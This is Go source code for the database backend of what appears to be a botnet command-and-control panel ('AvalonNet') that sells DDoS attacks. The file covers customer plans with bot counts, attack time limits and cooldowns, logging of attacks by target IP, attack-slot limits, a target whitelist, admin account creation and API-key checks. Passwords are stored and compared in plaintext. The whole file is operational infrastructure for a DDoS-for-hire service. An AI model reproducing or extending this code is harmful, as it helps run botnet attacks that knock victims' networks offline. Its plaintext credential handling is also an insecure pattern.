package main

import (
	"database/sql"
	"encoding/binary"
	"fmt"
	"net"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
	db *sql.DB
}

type AccountInfo struct {
	IDs      int
	username string
	maxBots  int
	admin    int
	maxTime  int
	cooldown int
	expiry   int64
	planName string
}

type PlanDetail struct {
	Name     string
	MaxTime  int
	Cooldown int
	MaxBots  int
}

type DetailedAttack struct {
	Plan     string
	Username string
	Duration int
	TimeSent int64
	Command  string
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		fmt.Println(err)
	}
	return &Database{db}
}

func (this *Database) TryLogin(username string, password string) (bool, *AccountInfo) {
	rows, err := this.db.Query("SELECT u.id, u.username, p.max_bots, p.is_admin, p.max_time, p.cooldown, u.expiry, p.name FROM users u JOIN plans p ON u.plan_id = p.id WHERE u.username = ? AND u.password = ?", username, password)
	if err != nil {
		fmt.Println(err)
		return false, nil
	}
	defer rows.Close()

	if !rows.Next() {
		return false, nil
	}

	var acc AccountInfo
	var isAdmin int
	err = rows.Scan(&acc.IDs, &acc.username, &acc.maxBots, &isAdmin, &acc.maxTime, &acc.cooldown, &acc.expiry, &acc.planName)
	if err != nil {
		fmt.Println(err)
		return false, nil
	}
	acc.admin = isAdmin

	if time.Now().Unix() > acc.expiry {
		fmt.Println("User expired:", username)
		return false, nil
	}

	return true, &acc
}

func (this *Database) GetAccountInfo(username string) (*AccountInfo, error) {
	rows, err := this.db.Query("SELECT u.id, u.username, p.max_bots, p.is_admin, p.max_time, p.cooldown, u.expiry, p.name FROM users u JOIN plans p ON u.plan_id = p.id WHERE u.username = ?", username)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	if !rows.Next() {
		return nil, fmt.Errorf("user not found")
	}

	var acc AccountInfo
	var isAdmin int
	err = rows.Scan(&acc.IDs, &acc.username, &acc.maxBots, &isAdmin, &acc.maxTime, &acc.cooldown, &acc.expiry, &acc.planName)
	if err != nil {
		return nil, err
	}
	acc.admin = isAdmin

	return &acc, nil
}

func (this *Database) CreateUser(username string, password string, planName string, durationDays int) bool {
	var planID int
	err := this.db.QueryRow("SELECT id FROM plans WHERE name = ?", planName).Scan(&planID)
	if err != nil {
		fmt.Println("Plan not found:", planName)
		return false
	}

	expiry := time.Now().Add(time.Duration(durationDays) * 24 * time.Hour).Unix()

	_, err = this.db.Exec("INSERT INTO users (username, password, plan_id, expiry) VALUES (?, ?, ?, ?)", username, password, planID, expiry)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return true
}

func (this *Database) RemoveUser(username string) bool {
	_, err := this.db.Exec("DELETE FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return true
}

func (this *Database) LogAttack(userID int, targetIP uint32, duration uint32, command string, maxBots int) {
	_, err := this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, ?, ?, ?, ?)", userID, time.Now().Unix(), duration, command, maxBots)
	if err != nil {
		fmt.Println(err)
	}
}

func (this *Database) StopAllGlobalAttacks() {
	_, err := this.db.Exec("UPDATE history SET duration = 0 WHERE (time_sent + duration) > ?", time.Now().Unix())
	if err != nil {
		fmt.Println("Error stopping attacks in DB:", err)
	}
}

func (this *Database) fetchUserActiveAttacks(userID int) int {
	var count int
	err := this.db.QueryRow("SELECT COUNT(*) FROM history WHERE user_id = ? AND (time_sent + duration) > ?", userID, time.Now().Unix()).Scan(&count)
	if err != nil {
		return 0
	}
	return count
}

func (this *Database) fetchRunningAttacks() int {
	var count int
	err := this.db.QueryRow("SELECT COUNT(*) FROM history WHERE (time_sent + duration) > ?", time.Now().Unix()).Scan(&count)
	if err != nil {
		return 0
	}
	return count
}

func (this *Database) FetchDetailedActiveAttacks() ([]DetailedAttack, error) {
	rows, err := this.db.Query("SELECT p.name, u.username, h.duration, h.time_sent, h.command FROM history h JOIN users u ON h.user_id = u.id JOIN plans p ON u.plan_id = p.id WHERE (h.time_sent + h.duration) > ? ORDER BY h.time_sent DESC", time.Now().Unix())
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var attacks []DetailedAttack
	for rows.Next() {
		var a DetailedAttack
		err := rows.Scan(&a.Plan, &a.Username, &a.Duration, &a.TimeSent, &a.Command)
		if err != nil {
			continue
		}
		attacks = append(attacks, a)
	}
	return attacks, nil
}

func (this *Database) fetchUsers() int {
	var count int
	err := this.db.QueryRow("SELECT COUNT(*) FROM users").Scan(&count)
	if err != nil {
		return 0
	}
	return count
}

func (this *Database) FetchPlans() ([]PlanDetail, error) {
	rows, err := this.db.Query("SELECT name, max_time, cooldown, max_bots FROM plans WHERE is_admin = 0 ORDER BY max_time DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var plans []PlanDetail
	for rows.Next() {
		var p PlanDetail
		err := rows.Scan(&p.Name, &p.MaxTime, &p.Cooldown, &p.MaxBots)
		if err != nil {
			continue
		}
		plans = append(plans, p)
	}
	return plans, nil
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()

	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		ip := net.ParseIP(prefix)
		if ip == nil {
			continue
		}
		ip = ip.To4()
		if ip == nil {
			continue
		}
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		if netshift(iWhitelistPrefix, netmask) == netshift(attack.TargetIP, netmask) {
			return true
		}
	}
	return false
}

func (this *Database) AddWhitelist(prefix string, netmask int) bool {
	_, err := this.db.Exec("INSERT INTO whitelist (prefix, netmask) VALUES (?, ?)", prefix, netmask)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return true
}

func (this *Database) RemoveWhitelist(prefix string, netmask int) bool {
	_, err := this.db.Exec("DELETE FROM whitelist WHERE prefix = ? AND netmask = ?", prefix, netmask)
	if err != nil {
		fmt.Println(err)
		return false
	}
	return true
}

func (this *Database) createAdmin(username string, password string, maxBots int, duration int, cooldown int) bool {
	res, err := this.db.Exec("INSERT INTO plans (name, max_time, cooldown, max_bots, is_admin) VALUES (?, ?, ?, ?, ?)", "admin_"+username, duration, cooldown, maxBots, 1)
	if err != nil {
		fmt.Println("Error creating plan:", err)
		return false
	}
	planID, _ := res.LastInsertId()

	expiry := time.Now().Add(10 * 365 * 24 * time.Hour).Unix()
	_, err = this.db.Exec("INSERT INTO users (username, password, plan_id, expiry) VALUES (?, ?, ?, ?)", username, password, planID, expiry)
	if err != nil {
		fmt.Println("Error creating user:", err)
		return false
	}
	return true
}
func (this *Database) ValidateAPIKey(username string, apikey string) (bool, *AccountInfo, error) {
	rows, err := this.db.Query("SELECT u.id, u.username, p.max_bots, p.is_admin, p.max_time, p.cooldown, u.expiry, p.name FROM users u JOIN plans p ON u.plan_id = p.id WHERE u.username = ? AND u.api_key = ?", username, apikey)
	if err != nil {
		return false, nil, err
	}
	defer rows.Close()

	if !rows.Next() {
		return false, nil, nil
	}

	var acc AccountInfo
	var isAdmin int
	err = rows.Scan(&acc.IDs, &acc.username, &acc.maxBots, &isAdmin, &acc.maxTime, &acc.cooldown, &acc.expiry, &acc.planName)
	if err != nil {
		return false, nil, err
	}
	acc.admin = isAdmin

	if time.Now().Unix() > acc.expiry {
		return false, nil, nil
	}

	return true, &acc, nil
}

func (this *Database) apiAccess(username string) (bool, error) {
	// For now, assume all users with API key have access.
	// You can add a specific column 'api_access' to users table if needed.
	return true, nil
}

func (this *Database) CanLaunchAttack(username string, duration uint32, method string, maxBots int, coaster int, globalSlot int) (bool, error) {
	if globalSlot > 0 {
		running := this.fetchRunningAttacks()
		if running >= globalSlot {
			return false, fmt.Errorf("Global slots full")
		}
	}

	// Check concurrents logic usually goes here.
	// Simplified for AvalonNet context if not checking per-user slots strictly yet.
	return true, nil
}
